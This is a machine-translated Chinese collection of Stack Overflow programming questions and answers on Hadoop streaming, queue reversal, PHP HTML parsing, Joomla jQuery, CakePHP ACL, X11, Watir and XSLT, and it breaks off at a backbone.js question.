> 单例会话 bean对**每个应用程序进行一次实例化，**并在应用程序的整个生命周期中存在。单例会话 bean 设计用于单个企业 bean 实例在客户端之间共享并由客户端同时访问的情况。

# xml - 使用 Hadoop 流处理 XML 失败

> ID：15562650
> 
> 赞同：0
> 
> 时间：2013-03-22T04:17:55.623
> 
> 标签：xml, hadoop, hadoop-streaming

我做了

```
bin/hadoop jar contrib/streaming/hadoop-streaming-1.0.4.jar -inputreader "StreamXmlRecordReader, begin=<metaData>,end=</metaData>" -input /user/root/xmlpytext/metaData.xml -mapper /Users/amrita/desktop/hadoop/pythonpractise/mapperxml.py -file /Users/amrita/desktop/hadoop/pythonpractise/mapperxml.py -reducer /Users/amrita/desktop/hadoop/pythonpractise/reducerxml.py  -file /Users/amrita/desktop/hadoop/pythonpractise/mapperxml.py -output /user/root/xmlpytext-output1 -numReduceTasks 1 
```

但它显示

```
13/03/22 09:38:48 INFO mapred.FileInputFormat: Total input paths to process : 1
13/03/22 09:38:49 INFO streaming.StreamJob: getLocalDirs(): [/Users/amrita/desktop/hadoop/temp/mapred/local]
13/03/22 09:38:49 INFO streaming.StreamJob: Running job: job_201303220919_0001
13/03/22 09:38:49 INFO streaming.StreamJob: To kill this job, run:
13/03/22 09:38:49 INFO streaming.StreamJob: /private/var/root/hadoop-1.0.4/libexec/../bin/hadoop job  -Dmapred.job.tracker=-kill job_201303220919_0001
13/03/22 09:38:49 INFO streaming.StreamJob: Tracking URL: http://localhost:50030/jobdetails.jsp?jobid=job_201303220919_0001
13/03/22 09:38:50 INFO streaming.StreamJob:  map 0%  reduce 0%
13/03/22 09:39:26 INFO streaming.StreamJob:  map 100%  reduce 100%
13/03/22 09:39:26 INFO streaming.StreamJob: To kill this job, run:
13/03/22 09:39:26 INFO streaming.StreamJob: /private/var/root/hadoop-1.0.4/libexec/../bin/hadoop job  -Dmapred.job.tracker=-kill job_201303220919_0001
13/03/22 09:39:26 INFO streaming.StreamJob: Tracking URL: http:///jobdetails.jsp?jobid=job_201303220919_0001
13/03/22 09:39:26 ERROR streaming.StreamJob: Job not successful. Error: # of failed Map Tasks exceeded allowed limit. FailedCount: 1\. LastFailedTask: task_201303220919_0001_m_000000
13/03/22 09:39:26 INFO streaming.StreamJob: killJob...
Streaming Command Failed! 
```

当我浏览jobdetails.jsp时，它显示

```
java.lang.RuntimeException: java.lang.reflect.InvocationTargetException
    at org.apache.hadoop.streaming.StreamInputFormat.getRecordReader(StreamInputFormat.java:77)
    at org.apache.hadoop.mapred.MapTask$TrackedRecordReader.<init>(MapTask.java:197)
    at org.apache.hadoop.mapred.MapTask.runOldMapper(MapTask.java:418)
    at org.apache.hadoop.mapred.MapTask.run(MapTask.java:372)
    at org.apache.hadoop.mapred.Child$4.run(Child.java:255)
    at java.security.AccessController.doPrivileged(Native Method)
    at javax.security.auth.Subject.doAs(Subject.java:396)
    at org.apache.hadoop.security.UserGroupInformation.doAs(UserGroupInformation.java:1121)
    at org.apache.hadoop.mapred.Child.main(Child.java:249)
Caused by: java.lang.reflect.InvocationTargetException
    at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method)
    at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:39)
    at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:27)
    at java.lang.reflect.Constructor.newInstance(Constructor.java:513)
    at org.apache.hadoop.streaming.StreamInputFormat.getRecordReader(StreamInputFormat.java:74)
    ... 8 more
Caused by: java.io.IOException: JobConf: missing required property: stream.recordreader.begin
    at org.apache.hadoop.streaming.StreamXmlRecordReader.checkJobGet(StreamXmlRecordReader.java:278)
    at org.apache.hadoop.streaming.StreamXmlRecordReader.<init>(StreamXmlRecordReader.java:52)
    ... 13 more 
```

我的映射器

```
#!/usr/bin/env python
import sys
import cStringIO
import xml.etree.ElementTree as xml
def cleanResult(element):
    result = None
    if element is not None:
        result = element.text
        result = result.strip()
    else:
        result = ""
    return result
def process(val):
    root = xml.fromstring(val)
    sceneID = cleanResult(root.find('sceneID'))
    cc = cleanResult(root.find('cloudCover'))
    returnval = ("%s,%s") % (sceneID,cc)
    return returnval.strip()
if __name__ == '__main__':
    buff = None
    intext = False
    for line in sys.stdin:
        line = line.strip()
        if line.find("<metaData>") != -1:
            intext = True
            buff = cStringIO.StringIO()
             buff.write(line)
         elif line.find("</metaData>") != -1:
              intext = False
              buff.write(line)
              val = buff.getvalue()
              buff.close()
              buff = None
              print process(val)
        else:
            if intext:
                buff.write(line) 
```

和减速机

```
#!/usr/bin/env python
import sys
if __name__ == '__main__':
     for line in sys.stdin:
         print line.strip() 
```

谁能告诉我为什么会这样。我正在使用 hadoop-1.0.4 im mac。有什么不对的吗。我应该改变什么吗？请帮帮我。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-03-27T22:12:32.350

删除逗号和 begin 之间的空格`, begin=<`。

正确的格式是：

```
hadoop jar hadoop-streaming.jar -inputreader
"StreamXmlRecord,begin=BEGIN_STRING,end=END_STRING" ..... (rest of the command) 
```

这是由于围绕以下行的代码`org.apache.hadoop.streaming.StreamJob`

```
for (int i = 1; i < args.length; i++) {
    String[] nv = args[i].split("=", 2);
    String k = "stream.recordreader." + nv[0];
    String v = (nv.length > 1) ? nv[1] : "";
    jobConf_.set(k, v);
  } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-22T10:42:16.280

尝试如下设置缺少的配置变量（添加`stream.recordreader.`前缀并确保它们是 jar 之后的第一个参数，将它们括在双引号中）：

```
bin/hadoop jar contrib/streaming/hadoop-streaming-1.0.4.jar \
  "-Dstream.recordreader.begin=<metaData>" \
  "-Dstream.recordreader.end=</metaData>" \
  -inputreader "StreamXmlRecordReader \
  -input /user/root/xmlpytext/metaData.xml \
  -mapper /Users/amrita/desktop/hadoop/pythonpractise/mapperxml.py \
  -file /Users/amrita/desktop/hadoop/pythonpractise/mapperxml.py \
  -reducer /Users/amrita/desktop/hadoop/pythonpractise/reducerxml.py \
  -file /Users/amrita/desktop/hadoop/pythonpractise/mapperxml.py \
  -output /user/root/xmlpytext-output1 \
  -numReduceTasks 1 
```

# algorithm - 以非常规方式反转队列

> ID：15562651
> 
> 赞同：4
> 
> 时间：2013-03-22T04:18:02.307
> 
> 标签：algorithm, recursion, queue

假设我有一个填充了某种类型元素的队列，并且它们的填充方式是，如果任何两个元素被指定的比较器评估为相同，它们将彼此相邻。

现在我想通过以下方式反转队列：如果队列中的所有元素都是唯一的，则将其反转为reverse的正常定义。

如果有一些相同的元素（并且考虑到它们的填充方式，它们将彼此相邻），则反转队列但保持非唯一元素的相对位置不变。

图表可能更容易理解问题所在。

如果队列如下：

```
[11 22 33 44 55] 
```

我的比较器通过查看它们的第一个数字来比较两个整数，那么上面队列的反面将是：

```
[55 44 33 22 11] 
```

但是，如果我的输入队列是：

```
[11 22 23 44 55] 
```

相反的应该是：

```
[55 44 22 23 11] 
```

给定比较器。

我正在尝试以递归方式执行此操作，只有一个堆栈作为额外的辅助存储。但是，我很难找出正确有效的方法。能否请你帮忙？非常感谢你！

PS：我使用堆栈作为额外存储的原因是因为以传统方式反转队列最容易使用堆栈完成（出列并将所有内容推入堆栈，然后弹出并入队返回队列）。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-22T08:29:01.553

**方法 1)**

首先反转整个队列（不考虑 21,22 等的相等性），然后使用堆栈反转每个单独的块（即 21,22 等）。这可以迭代地完成。

这类似于句子问题（著名的面试问题）中的反向词。

（请参阅下面的示例和伪代码）

**方法2）**

如果您绝对想进行递归，那么我建议您使用队列作为辅助存储，而不是堆栈。

您将一个块排入辅助队列，递归地反转列表的其余部分，然后将元素重新排入主队列。

代码将是这样的（handwavy 伪）

```
StrangeReverse(Queue <T> q) {
    Queue<T> aux;
    // this removes first block from q, and places them in aux
    while (elem_of_first_block(q)) {
        aux.Enque(elem);
    }
    // Recursively reverse the rest of the q.
    StrangeReverse(q);

    // place the first block back in q, at the end.
    // in the order they appeared originally.
    while (aux.HasElements()) {
        q.Enque(aux.Deque());
    }
} 
```

递归版本可以通过队列堆栈转换为迭代！您从每个块中创建一个队列，并将它们堆叠起来。然后弹出堆栈，使用队列。

**方法 1 的示例**

`[11, 12, 21, 22, 43, 44]`

反转这个（使用堆栈或递归方法）

`[44, 43, 22, 21, 12, 11]`

现在反转每个块：

`push 44, the 43.`

`Stack = [44, 43]. Queue = [22, 21, 12, 11]`

现在通过从堆栈中弹出来入队

`Stack = [], Queue = [22, 21, 12, 11, 43, 44]`

`push 22, 21`

`Stack = [22, 21], Queue = [12, 11, 43, 44]`

通过弹出堆栈来入队。

`Stack = [], Queue = [12, 11, 43, 44, 21, 22]`

最后我们得到

`[43, 44, 21, 22, 11, 12]`

注意：要确定一个块，您可能需要在队列上使用 peek 方法。

**方法一的伪代码**

```
void StrangeReverse(Queue<T> q) {
    Stack<T> s;
    int count = q.Count();
    if (count < 2) return;
    for (i = 0; i < count; i++) {
        T elem = q.Deque();
        s.Push(elem);
    }    
    while (s.HasElements()) {
        T elem = s.Pop();
        q.Enque(elem);
    }
    // Now the queue has been reversed,
    // in the normal fashion.
    ReverseBlocks(q);
}

void ReverseBlocks(Queue<T> q) {
    int reversed = 0;
    int count = q.Count();
    while (reversed < count) {
        reversed += ReverseSingleBlock(q);
    }
}

int ReverseSingleBlock(Queue <T> q) {
    Stack <T> s;
    T prevElem = q.Deque();
    s.Push(prevElem);
    T curElem = q.Peek();
    while(curElem == prevElem) {
        s.Push(curElem);
        q.Deque();
        prevElem = curElem;
        curElem = q.Peek();
    }
    int count = 0;
    while(s.HasElements()) {
        T elem = s.Pop();
        q.Enque(elem);
        count++;
    }
    return count;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-22T04:36:09.683

仍然假设： enque -> [11,21,22,23,30] -> deque/peek
现在应该更好：

```
first = queue.peek();
start = true;
while (queue.peek() != first || start) {
  start = false;
  el = queue.deque();
  if (el.compare(queue.peek())) {
    stack.push(el);
    while (el.compare(queue.peek())) {
      el1 = queue.dequeue();
      if (first.compare(el1)) {
        first = el1;
      }
      stack.push(el1);
    }
    while (!stack.isEmpty()) {
      queue.enque(stack.pop());       
    }
  } else {
    queue.enque(el);
  }
}
while (!queue.isEmpty()) {
  stack.push(queue.deque());
}
while (!stack.isEmpty()) {
  queue.enque(stack.pop());
} 
```

所以首先我正在旋转队列，改变“等效”元素的顺序，最后我正在做一个普通的队列反向

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-12-13T15:56:39.333

```
 class ReverseQueue(object):
    def __init__(self, limit=5):
        self.rear = None
        self.front = None
        self.que = []
        self.size = 0
        self.limit = limit

   def enQueue(self, item):
        if self.size >= self.limit:
            print "Queue Overflow"
            return
        else:
            self.que.append(item)

        # two case
        # 1\. if front is None then the queue is empty.
        #    so if item is added both front
        #    end point to the same position i.e 0
        # 2\. if front is not None then item is added to the end of the
        #    list(append does that). we then increase the size of rear

        # note: rear is 0 indexed but size is not
        # that's why there's a diff of 1 always b/w these rear and size
        if self.front is None:
            self.rear = self.front = 0
            self.size = 1
        else:
            self.rear = self.size
            self.size += 1

        return

    def deQueue(self):
          if self.size <= 0:
              print "Queue Underflow"
              return
          else:
              temp = self.que.pop(0)

          # change the size
          self.size -= 1

          # if list is empty set both front and rear = None
          # This is in sync with the queue method
          #  where we check if front = none when adding item
          # change front and rear
          if self.size is 0:
             # if only one element
             self.rear = self.front = None
          else:
             # more then one element
             self.rear -= 1

          return temp

      def isEmpty(self):
          return self.size <= 0

      def reverse(self):
          if not self.isEmpty():
              temp = self.deQueue()
              self.reverse()
              self.enQueue(temp) 
```

我的队列 = 反向队列（）

myQueue.enQueue("第一")

myQueue.enQueue("第二个")

myQueue.enQueue("第三个")

myQueue.enQueue("第四")

myQueue.enQueue("第五个")

打印 myQueue.que

myQueue.reverse()

打印 myQueue.que

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2017-09-02T01:54:24.980

这是使用递归反转 C++ STL 队列的代码片段。

```
void reverseQueue(queue<int>& q){
    while(q.size() != 0){
        q.pop();

        reverseQueue(q);

        q.push(value);
        break;
    }
} 
```

# php - 从简单 HTML DOM 中的特定标签获取第一个元素和第二个元素

> ID：15562652
> 
> 赞同：0
> 
> 时间：2013-03-22T04:18:22.017
> 
> 标签：php, simple-html-dom

我有两个具有相同类名的 div 标签一个接一个：-

**HTML：**

```
<div class='random'>
    <div class="name">
        <h1>Title 1</h1>
        <p>Description</p>
    </div>
    <div class="name">
        <h1>Title 2</h1>
        <p>Other Description</p>
    </div>
</div>
<div class='random'>
    <div class="name">
        <h1>Title 2-1</h1>
        <p>Description2</p>
    </div>
    <div class="name">
        <h1>Title 2-2</h1>
        <p>Other Description2</p>
    </div>
</div>
.....
..... 
```

现在我想分别获得两个描述：

> 所需的输出 1：-
> 说明
> 
> 所需的输出 2：-
> 其他说明
> 
> 但我的输出：
> 描述
> 其他描述

**代码：**

```
foreach($html->find('div.name p') as $value)
{
    echo $value->innertext;
} 
```

有什么方法可以让我们只指定要打印的第一类或第二类吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-22T06:40:16.647

头等舱：

```
$html->find('div.name[1] p') 
```

第二类：

```
$html->find('div.name[2] p') 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-06-18T11:53:46.437

```
// Find (N)th anchor, returns element object or null if not found (zero based)
$ret = $html->find('a', 0);

// Find lastest anchor, returns element object or null if not found (zero based)
$ret = $html->find('a', -1); 
```

尝试这个。它有助于！

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-22T04:23:00.017

[PHP 简单 HTML DOM 解析器手册](http://simplehtmldom.sourceforge.net/manual_api.htm)

```
mixed find ( string $selector [, int $index] )  Find children by the CSS selector. Returns the Nth element object if index is set, otherwise, return an array of object. 
```

不要使用循环，而是执行以下操作：

```
echo "Output 1 desired:-<BR>";
echo $html->find('div.name p', 0) . "<BR>";
echo "Output 1 desired:-<BR>";
echo $html->find('div.name p', 1); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-22T05:11:47.023

试试这个代码

```
$count = count($html->find('div.name p'));

 for($index=0; $index<$count; $index++)
{
$text = getElementByIndex($html, $index);
echo "output $index : $text";
}

function getElementByIndex($html,$index)
{
return $html->find('div.name p', $index);
} 
```

希望对你有帮助..

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2020-07-04T00:58:22.393

只需使用此代码

```
echo  $htmlEN->find('.name h1', 0)->innertext;
echo  $htmlEN->find('.name p', 0)->innertext; 
```

和

```
echo  $htmlEN->find('.name h1', 1)->innertext;
echo  $htmlEN->find('.name p', 1)->innertext; 
```

……

# joomla - 在头部标签中插入脚本后，我的菜单和幻灯片消失了

> ID：15562658
> 
> 赞同：1
> 
> 时间：2013-03-22T04:18:49.800
> 
> 标签：joomla

我最近开始使用 joomla 模板 SJ_News_25。我的网站上有一个“商店定位器”，需要我在标签内插入一个脚本。当我这样做时，它往往会杀死我的下拉菜单。

我注意到我的 head 标签之前的一些代码似乎缺少一个“>”（我认为）。这会是问题吗？标签前的代码是；

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="<?php echo $this->language; ?>" <?php echo ($ytrtl == 'rtl')?'dir="rtl"':''; ?> lang="<?php echo $this->language; ?>"> 
```

任何帮助都会很棒

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T07:38:06.767

这听起来像一个 Javascript 错误。这些通常显示在浏览器开发者工具/Firebug 的控制台中。

现在查看您的页面，它显示此 Javascript 代码的错误“Uncaught TypeError: Object # has no method 'ready'”：

```
$(document).ready(function(){
    Uncaught TypeError: Object #<HTMLDocument> has no method 'ready'
    $('#null').prettyPhoto();
}); 
```

这里的问题是您使用`$`调用 jQuery，但是您在无冲突模式下加载了 jQuery。这意味着它应该是`jQuery(document).ready(....)`。这就是幻灯片消失的原因。至于商店定位器脚本，可能是类似的问题，但不看实际代码很难说。我会先解决幻灯片的问题，然后再尝试添加其他脚本。

# php - 插件模型关联在带有 cake ACL 的 cakephp 2.3 中不起作用

> ID：15562664
> 
> 赞同：2
> 
> 时间：2013-03-22T04:19:44.530
> 
> 标签：php, cakephp, acl, cakephp-2.3

我只是想在一个名为“Cauth”的插件中实现 Cakephp ACL 用户身份验证。我之前实施的同样的事情工作正常。这次不同的是，它在插件下。在这里，在控制器中， $this->User->Group->find('list'); 不管用。我收到以下致命错误：

```
Fatal Error

Error: Call to a member function find() on a non-object
File: my_dir_path\app\Plugin\Cauth\Controller\UsersController.php
Line: 60

Notice: If you want to customize this error message, create app\View\Errors\fatal_error.ctp 
```

我的代码如下：

团体型号：

```
var $useTable = 'groups';
public $hasMany = array (
    'User' => array (
        'className'    => 'Cauth.User',
        'foreignKey'   => 'group_id',
        'dependent'    => false,
        'conditions'   => '',
        'fields'       => '',
        'order'        => '',
        'limit'        => '',
        'offset'       => '',
        'exclusive'    => '',
        'finderQuery'  => '',
        'counterQuery' => ''
    )
); 
```

用户型号：

```
var $useTable = 'users';
public $belongsTo = array (
    'Group' => array (
        'className'  => 'Cauth.Group',
        'foreignKey' => 'group_id',
        'conditions' => '',
        'fields'     => '',
        'order'      => ''
    )
); 
```

用户控制器添加操作，组选择框不起作用。

用户控制器添加操作：

```
App::uses('CauthAppController', 'Cauth.Controller');
class UsersController extends CauthAppController {
public function add() {
    if ($this->request->is('post')) {
        $this->User->create();
        if ($this->User->save($this->request->data)) {
            $this->Session->setFlash(__('The user has been saved'));
            $this->redirect(array ('action' => 'index'));
        } else {
            $this->Session->setFlash(__('The user could not be saved. Please, try again.'));
        }
    }

    $groups = $this->User->Group->find('list');
    $this->set(compact('groups'));

} 
```

谁能帮我解决这个问题。

特别说明：它正在处理以下案例。

**情况1：**

如果我从控制器绑定模型，它就可以正常工作。

```
$this->User->bindModel(
    array ('belongsTo' => array ('Group'))
); 
```

IE

```
public function add() {
    $this->User->bindModel(
        array ('belongsTo' => array ('Group'))
    );
    if ($this->request->is('post')) {
        $this->User->create();
        if ($this->User->save($this->request->data)) {
            $this->Session->setFlash(__('The user has been saved'));
            $this->redirect(array ('action' => 'index'));
        } else {
            $this->Session->setFlash(__('The user could not be saved. Please, try again.'));
        }
    }

    $groups = $this->User->Group->find('list');
    $this->set(compact('groups'));

} 
```

**案例二：**

如果我允许所有人的操作名称。管理员拥有所有权限，尽管我还需要为管理员编写 beforeFilter。

```
public function beforeFilter() {
    parent::beforeFilter();
    $this->Auth->allow('index', 'add');
} 
```

我又找到了一个案例来使它可行。

**案例3：**

我的 AppController 的代码是 -

```
class AppController extends Controller {

    public $helpers    = array ('Form', 'Time', 'Html', 'Session', 'Js', 'DebugKit.Toolbar');
    public $counter    = 0;
    public $components = array (
        'DebugKit.Toolbar',
        'RequestHandler',
        'Acl',
        'Auth' => array (
            'authorize' => array (
                'Actions' => array ('actionPath' => 'controllers')
            )
        ),
        'Session'
    );

    public function beforeFilter() {
        //Configure AuthComponent
        $this->Auth->loginAction    = array ('plugin'     => 'cauth', 'controller' => 'users', 'action'     => 'login');
        $this->Auth->logoutRedirect = array ('plugin'     => 'cauth', 'controller' => 'users', 'action'     => 'login');
        $this->Auth->loginRedirect  = array ('plugin'     => '', 'controller' => 'pages', 'action'     => 'display');

    }

} 
```

在这种情况下，它不起作用。但是当我成功的时候——

```
class AppController extends Controller {

    public $helpers    = array ('Form', 'Time', 'Html', 'Session', 'Js', 'DebugKit.Toolbar');
    public $counter    = 0;
    public $components = array (
        'DebugKit.Toolbar',
        'RequestHandler',
        'Acl',
        'Auth' => array (
            'authenticate' => array('Form')

        ),
        'Session'
    );

    public function beforeFilter() {
        //Configure AuthComponent
        $this->Auth->loginAction    = array ('plugin'     => 'cauth', 'controller' => 'users', 'action'     => 'login');
        $this->Auth->logoutRedirect = array ('plugin'     => 'cauth', 'controller' => 'users', 'action'     => 'login');
        $this->Auth->loginRedirect  = array ('plugin'     => '', 'controller' => 'pages', 'action'     => 'display');

    }

} 
```

然后该协会再次开始工作。仍然无法理解这个组件声明有什么问题。

```
public $components = array (
    'DebugKit.Toolbar',
    'RequestHandler',
    'Acl',
    'Auth' => array (
        'authorize'    => array (
            'Actions' => array ('actionPath' => 'controllers')
        )
    ),
    'Session'
); 
```

如果我不这样声明，我的 ACL 就不起作用。即所有组都获得相同的权限。

请帮我。我很长一段时间都在这方面。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-05-25T14:42:57.947

经过长时间的努力，我终于从以下链接找到了解决方案 -

[https://cakephp.lighthouseapp.com/projects/42648/tickets/2464-plugin-using-acl-not-loading-proper-model](https://cakephp.lighthouseapp.com/projects/42648/tickets/2464-plugin-using-acl-not-loading-proper-model)

当我使用 Auth 组件时，用户控制器没有使用 Cauth.user 模型。它是使用 AppModel 加载的。但是没有身份验证组件，它可以正常工作。这样使用 auth 组件的正确方法将是

```
 'Auth' => array (
        'authorize' => array (
            'Actions' => array (
                'actionPath' => 'controllers',
                'userModel'  => 'Cauth.User',
            ),
        )
    ), 
```

那就是总 AppController 将是 -

```
class AppController extends Controller {

    public $helpers    = array ('Form', 'Time', 'Html', 'Session', 'Js', 'DebugKit.Toolbar');
    public $counter    = 0;
    public $components = array (
        'DebugKit.Toolbar',
        'RequestHandler',
        'Acl',
        'Auth' => array (
            'authorize' => array (
                'Actions' => array (
                    'actionPath' => 'controllers',
                    'userModel'  => 'Cauth.User',
                ),
            )
        ),
        'Session'
    );

    public function beforeFilter() {
        //Configure AuthComponent
        $this->Auth->loginAction    = array ('plugin'     => 'cauth', 'controller' => 'users', 'action'     => 'login');
        $this->Auth->logoutRedirect = array ('plugin'     => 'cauth', 'controller' => 'users', 'action'     => 'login');
        $this->Auth->loginRedirect  = array ('plugin'     => '', 'controller' => 'pages', 'action'     => 'display');

    }

} 
```

现在一切正常。谢谢大家。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-22T04:41:26.473

假设 Group 是模型（表）的名称，请将此行更改为：

```
 $groups = $this->User->Group->find('list'); 
```

到

```
 $groups = $this->Group->find('list'); 
```

希望它会有所帮助！

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-05-16T19:59:06.853

尝试两件事来解决这个问题。首先将以下内容添加到您的用户和组插件控制器。

```
public $uses = array('Users.User', 'Users.Group'); 
```

其次，在插件控制器中定义组件。在蛋糕 ACL Auth 教程中，他们将其放在主 AppController 中，您需要将其移动到插件中。

您可以在 UsersAppController 或 UsersController 中执行以下操作

```
public $components = array(
        'Acl',
        'Auth',
        'Session'
    ); 
```

希望这有效，它对我有用。

# linux - 如何在X11中创建圆角矩形窗口

> ID：15562668
> 
> 赞同：2
> 
> 时间：2013-03-22T04:20:02.887
> 
> 标签：linux, x11, embedded-linux

我需要创建一个圆角矩形窗口，但是有 api 在 X11 中绘制圆角矩形。请告诉我如何在 X11 中创建一个圆角矩形窗口。提前致谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-22T05:38:29.113

看看[形状扩展库](http://www.x.org/docs/Xext/shapelib.pdf)。

# ruby - Watir - 使用 :after 选择器时获取 Watir::Heading (TypeError)

> ID：15562669
> 
> 赞同：1
> 
> 时间：2013-03-22T04:20:04.483
> 
> 标签：ruby, watir, functional-testing

我正在尝试获取无序列表中的特定链接。ul 元素位于页面上带有文本“应用程序帮助”的 h2 标题下方

我有一个 watir 步骤：

```
 app_help_header = @browser.h2(:text => "Application help")

  assert @browser.link(:after? => app_help_header, :text => link_text ).exists? 
```

我在第二行收到此错误：

```
# features/step_definitions/steps_86_application_help.rb:73
expected one of [String, Regexp], got #<Watir::Heading:0x50d30c54 located=
false selector={:text=>"Application help", :tag_name=>"h2"}>:Watir::Heading (Typ
eError)
./features/step_definitions/steps_86_application_help.rb:88:in `/^I click
on "(.*?)" in Application Help$/'
features\86_Application_Help.feature:22:in `And I click on "Ordering" in A
pplication Help' 
```

有谁知道为什么会这样？可用于 :after 属性的选择器类型是否有任何限制？

[http://wiki.openqa.org/display/WTR/HTML+Elements+Supported+by+Watir](http://wiki.openqa.org/display/WTR/HTML+Elements+Supported+by+Watir)上的文档在`:after`用作选择器时没有提及任何限制。

我试图获取链接的 HTML 是：

```
<div class="application-help-summary module">
<h2 class="portlet-section-header">Application help</h2>
    <div class="portlet-section-body">
        <p>Browse help for assistance with: </p>
        <ul class="bulleted">
                    <li>
                        <a href="/ordering-help">Ordering</a>
                    </li>
                    <li>
                        <a href="/managing-services-help">Managing services</a>
                    </li>
        </ul>

    </div>
</div> 
```

我正在尝试向 Watir 指定：“使用“应用程序帮助”获取在 h2 之后出现的此文本的链接

作为一种解决方法，我刚刚指定了更高级别的 div，然后直接获取链接，指定代码假设“应用程序帮助”h2 上方没有具有相同文本的链接。

# xml - xsl 1.0 中的行数据

> ID：15562671
> 
> 赞同：-1
> 
> 时间：2013-03-22T04:20:17.663
> 
> 标签：xml, xslt, xslt-1.0

我的 XML 中有多个 Row 元素数据，如下所示 -

```
<ROW TYPE="SPECIFICATION" ID="1">
    <R1>English1</R1>
</ROW>
<ROW TYPE="SPECIFICATION" ID="1">
    <R1>Maths1</R1>
</ROW>
<ROW TYPE="TOTAL" ID="1">
    <R1>Code1</R1>
</ROW>
<ROW TYPE="SPECIFICATION" ID="2">
    <R1>English2</R1>
</ROW>
<ROW TYPE="SPECIFICATION" ID="2">
    <R1>Maths2</R1>
</ROW>
<ROW TYPE="TOTAL" ID="2">
    <R1>Code2</R1>
</ROW>
<ROW TYPE="MAIN" ID="3">
    <R1>Code3</R1>
</ROW>
<ROW TYPE="SPECIFICATION" ID="4">
    <R1>English4</R1>
</ROW>
<ROW TYPE="TOTAL" ID="4">
    <R1>Code4</R1>
</ROW> 
```

我希望我的输出显示在 Image 中，就像这个 ROW 数据在 for-each 循环中一样工作。要求是首先显示 ROW TYPE="TOTAL" ID="1"，然后显示其 ROW TYPE="SPECIFICATION" 数据。在循环中进一步移动，应该首先显示 ROW TYPE="TOTAL" ID="2"，然后显示其 ROW TYPE="SPECIFICATION" 数据。如果 ROW_TYPE 不同（可以是任何东西），那么它应该按顺序出现。它仅特定于 SPECIFICATION 和 TOTAL。

基本上应该是这样的——

```
Code1
  English1
  Maths1
Code2
  English2
  Maths2
Code3
Code4
  English4 
```

xslt 代码适用于序列，就像 for-each 循环一样。但我需要先为该 ID 移动 TOTAL 行。请为此提出逻辑。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T05:06:58.230

**这种转变**：

```
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
 <xsl:output omit-xml-declaration="yes" indent="yes"/>
 <xsl:strip-space elements="*"/>
 <xsl:key name="kRowById"
      match="ROW[not(@TYPE='TOTAL' or @TYPE='MAIN')]"
      use="@ID"/>

 <xsl:template match="ROW[@TYPE='TOTAL' or @TYPE='MAIN']">
  <xsl:copy-of select="."/>
  <xsl:copy-of select="key('kRowById', @ID)"/>
 </xsl:template>
 <xsl:template match="text()"/>
</xsl:stylesheet> 
```

**当应用于 XML 文档时**（从提供的 XML 片段生成，通过将其包装到单个顶部元素中）：

```
<t>
    <ROW TYPE="SPECIFICATION" ID="1">
        <R1>English1</R1>
    </ROW>
    <ROW TYPE="SPECIFICATION" ID="1">
        <R1>Maths1</R1>
    </ROW>
    <ROW TYPE="TOTAL" ID="1">
        <R1>Code1</R1>
    </ROW>
    <ROW TYPE="SPECIFICATION" ID="2">
        <R1>English2</R1>
    </ROW>
    <ROW TYPE="SPECIFICATION" ID="2">
        <R1>Maths2</R1>
    </ROW>
    <ROW TYPE="TOTAL" ID="2">
        <R1>Code2</R1>
    </ROW>
    <ROW TYPE="MAIN" ID="3">
        <R1>Code3</R1>
    </ROW>
    <ROW TYPE="SPECIFICATION" ID="4">
        <R1>English4</R1>
    </ROW>
    <ROW TYPE="TOTAL" ID="4">
        <R1>Code4</R1>
    </ROW>
</t> 
```

**产生想要的正确结果：**

```
<ROW TYPE="TOTAL" ID="1">
    <R1>Code1</R1>
</ROW>
<ROW TYPE="SPECIFICATION" ID="1">
    <R1>English1</R1>
</ROW>
<ROW TYPE="SPECIFICATION" ID="1">
    <R1>Maths1</R1>
</ROW>
<ROW TYPE="TOTAL" ID="2">
    <R1>Code2</R1>
</ROW>
<ROW TYPE="SPECIFICATION" ID="2">
    <R1>English2</R1>
</ROW>
<ROW TYPE="SPECIFICATION" ID="2">
    <R1>Maths2</R1>
</ROW>
<ROW TYPE="MAIN" ID="3">
    <R1>Code3</R1>
</ROW>
<ROW TYPE="TOTAL" ID="4">
    <R1>Code4</R1>
</ROW>
<ROW TYPE="SPECIFICATION" ID="4">
    <R1>English4</R1>
</ROW> 
```

**更新**：

根据 OP 在评论中的要求，如果必须将任何不同于“SPECIFICATION”的值放在组的开头，请使用以下代码：

```
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
 <xsl:output omit-xml-declaration="yes" indent="yes"/>
 <xsl:strip-space elements="*"/>
 <xsl:key name="kRowById"
      match="ROW[not(@TYPE='TOTAL' or @TYPE='MAIN')]"
      use="@ID"/>

 <xsl:template match="ROW[not(@TYPE='SPECIFICATION')]">
  <xsl:copy-of select="."/>
  <xsl:copy-of select="key('kRowById', @ID)"/>
 </xsl:template>
 <xsl:template match="text()"/>
</xsl:stylesheet> 
```

# javascript - 活动不工作？

> ID：15562678
> 
> 赞同：1
> 
> 时间：2013-03-22T04:21:04.480
> 
> 标签：javascript, backbone.js

我正在尝试运行以下代码：

```
